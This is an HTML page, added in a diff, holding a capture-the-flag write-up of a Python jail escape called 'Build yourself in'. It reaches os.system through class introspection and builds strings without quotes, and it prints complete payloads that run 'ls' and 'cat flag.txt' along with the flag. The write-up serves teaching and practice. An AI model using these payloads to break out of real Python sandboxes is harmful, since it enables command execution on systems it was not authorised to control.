@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Build yourself in</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>nc</li>
+            <li>python3 shell</li>
+            <li>exec()</li>
+            <li>no builtins</li>
+            <li>introspection</li>
+            <li>_wrap_close</li>
+            <li>no strings</li>
+            <li>RCE</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Build_yourself_in_0"></a>Build yourself in</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">The extraterrestrials have upgraded their authentication system and now only them are able to pass. Did you manage to learn their language well enough in order to bypass the the authorization check?</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Methodology_4"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">This is an <code>nc</code> challenge without a source code.</p>
+<p class="has-line-data" data-line-start="7" data-line-end="8">When we connect we have some sort of a “shell”. We can try to input some special character like <code>$</code>.</p>
+<pre><code class="has-line-data" data-line-start="9" data-line-end="25" class="language-python"><span class="hljs-number">3.8</span><span class="hljs-number">.9</span> (default, Apr <span class="hljs-number">15</span> <span class="hljs-number">2021</span>, <span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">04</span>) 
+[GCC <span class="hljs-number">10.2</span><span class="hljs-number">.1</span> <span class="hljs-number">20201203</span>]
+
+[*] Only  are allowed!
+
+<span class="hljs-prompt">&gt;&gt;&gt; </span>$
+Traceback (most recent call last):
+  File <span class="hljs-string">"/app/build_yourself_in.py"</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> &lt;module&gt;
+    main()
+  File <span class="hljs-string">"/app/build_yourself_in.py"</span>, line <span class="hljs-number">13</span>, <span class="hljs-keyword">in</span> main
+    exec(text, {<span class="hljs-string">'__builtins__'</span>: <span class="hljs-keyword">None</span>, <span class="hljs-string">'print'</span>:<span class="hljs-keyword">print</span>})
+  File <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>
+    $
+    ^
+SyntaxError: invalid syntax
+</code></pre>
+<p class="has-line-data" data-line-start="26" data-line-end="27">The program crashed and we see we are inside and <code>exec()</code> function with <code>__builtins__</code> disabled which will complicate things. Because of this we cannot use any builtin python methods.</p>
+<p class="has-line-data" data-line-start="28" data-line-end="29">We can use python <code>introspection</code> to get all available classes from the interpreter.</p>
+<pre><code class="has-line-data" data-line-start="31" data-line-end="35">&gt;&gt;&gt; print(().__class__.__base__.__subclasses__())
+[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;,
+[REDACTED]
+</code></pre>
+<p class="has-line-data" data-line-start="36" data-line-end="37">We need a class that has a reference to <code>__import__</code> or has a reference to <code>system()</code> function so we can exec OS commands. Class <code>catch_warnings</code> has a reference to <code>__import__</code> but the this current interpreter doesn’t have a reference to this class. There is another class <code>os._wrap_close</code>, which has a reference to <code>__globals__['system']</code> with which we can execute commands. We can find this class with this command (props to HackTricks).</p>
+<pre><code class="has-line-data" data-line-start="39" data-line-end="41" class="language-python">[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">'_wrap_close'</span> ][<span class="hljs-number">0</span>][<span class="hljs-string">'system'</span>](<span class="hljs-string">'ls'</span>)
+</code></pre>
+<p class="has-line-data" data-line-start="42" data-line-end="43">With this piece of code we will loop the list of classes and find the class called <code>_wrap_close</code> and execute <code>ls</code>.</p>
+<p class="has-line-data" data-line-start="44" data-line-end="45"><img src="./denied.PNG" alt="denied"></p>
+<p class="has-line-data" data-line-start="46" data-line-end="47">We cannot use quotes. Luckily, I wrote a script that can generate string literals in python without using <code>'</code> or <code>&quot;</code>. My <a href="https://github.com/s-3ntinel/py-string-assembler">script</a> is here. We will use it to generate string literals for strings <code>_wrap_close</code>, <code>system</code> and <code>ls</code>. Be sure to use python3 with the script because the challenge uses python3 also.</p>
+<pre><code class="has-line-data" data-line-start="49" data-line-end="57" class="language-bash">$ python3 py-string-assembler.py <span class="hljs-operator">-s</span> <span class="hljs-string">"_wrap_close"</span>
+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">99</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">13</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">2</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">9</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">5</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>]
+
+$ python3 py-string-assembler.py <span class="hljs-operator">-s</span> <span class="hljs-string">"system"</span>                                                                                              ().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">1</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">17</span>]
+
+$ python3 py-string-assembler.py <span class="hljs-operator">-s</span> <span class="hljs-string">"ls"</span>
+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]
+</code></pre>
+<p class="has-line-data" data-line-start="58" data-line-end="59">Substitute the output for the strings and we have a working payload.</p>
+<h2 class="code-line" data-line-start=60 data-line-end=61><a id="Exploit_60"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="61" data-line-end="62">Payload for <code>ls</code>.</p>
+<pre><code class="has-line-data" data-line-start="64" data-line-end="66" class="language-python">[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == ().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">99</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">13</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">2</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">9</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">5</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>] ][<span class="hljs-number">0</span>][().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">1</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">17</span>]](().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>])
+</code></pre>
+<p class="has-line-data" data-line-start="67" data-line-end="68"><img src="./ls.PNG" alt="ls"></p>
+<p class="has-line-data" data-line-start="70" data-line-end="71">Now just generate a string <code>cat flag.txt</code> from the script and substitute it in payload. Payload for <code>cat flag.txt</code>.</p>
+<pre><code class="has-line-data" data-line-start="73" data-line-end="75" class="language-python">[ x.__init__.__globals__ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == ().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">99</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">13</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">2</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">11</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">9</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">5</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>] ][<span class="hljs-number">0</span>][().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">1</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">23</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">3</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">17</span>]](().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">9</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">20</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">103</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">174</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">16</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">127</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">4</span>].__doc__[<span class="hljs-number">5</span>]+().__class__.__base__.__subclasses__()[<span class="hljs-number">0</span>].__doc__[<span class="hljs-number">0</span>])
+</code></pre>
+<p class="has-line-data" data-line-start="76" data-line-end="77"><img src="./cat.PNG" alt="cat"></p>
+<h2 class="code-line" data-line-start=78 data-line-end=79><a id="Flag_78"></a>Flag</h2>
+<p class="has-line-data" data-line-start="79" data-line-end="80"><strong>CHTB{n0_j4il_c4n_h4ndl3_m3!}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
